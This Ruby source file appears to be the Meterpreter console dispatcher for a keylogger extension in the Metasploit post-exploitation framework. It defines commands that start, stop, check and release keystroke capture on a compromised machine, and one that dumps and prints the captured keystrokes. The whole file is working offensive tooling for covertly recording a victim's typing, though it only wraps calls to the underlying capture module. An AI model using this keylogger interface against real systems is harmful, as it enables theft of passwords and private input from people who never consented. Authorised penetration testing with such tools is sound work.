# -*- coding: binary -*-
require 'rex/post/meterpreter'

module Rex
module Post
module Meterpreter
module Ui

###
#
# Keylogger extension user interface.
#
###
class Console::CommandDispatcher::Keylogger

  Klass = Console::CommandDispatcher::Keylogger

  include Console::CommandDispatcher

  #
  # Initializes an instance of the keylogger command interaction.
  #
  def initialize(shell)
    super
  end

  #
  # List of supported commands.
  #
  def commands
    {
      "keylogger_start" => "Start keylogging",
      "keylogger_stop"  => "Stop keylogging",
      "keylogger_status"  => "View keylogging status",
      "keylogger_dump"  => "Retrieve keylogged data",
      "keylogger_release" => "Free keylogged data instead of downloading"
    }
  end

  def cmd_keylogger_start(*args)
    client.keylogger.capture_start()
    print_status("Keylogger capture started")

    return true
  end

  def cmd_keylogger_stop(*args)
    res = client.keylogger.capture_stop()
    print_status("Keylogger capture stopped")

    return true
  end

  def cmd_keylogger_status(*args)
    status = client.keylogger.capture_status()
    if status
      status_str = "active"
    else
      status_str = "inactive"
    end
    print_status("Keylogger capture is currently: #{status_str}")

    return true
  end

  def cmd_keylogger_release(*args)
    res = client.keylogger.capture_release()

    return true
  end

  def cmd_keylogger_dump(*args)
    capture_records = client.keylogger.capture_dump()
    capture_records.each { |r|
      capture_data = client.keylogger.capture_dump_read(r)
      if capture_data
        print_line("========== #{r} ==========")
        print_line("#{capture_data.to_s}")
        print_line
      end
    }
  end

  #
  # Name for this dispatcher
  # 
  def name
    "Keylogger"
  end

end

end
end
end
end
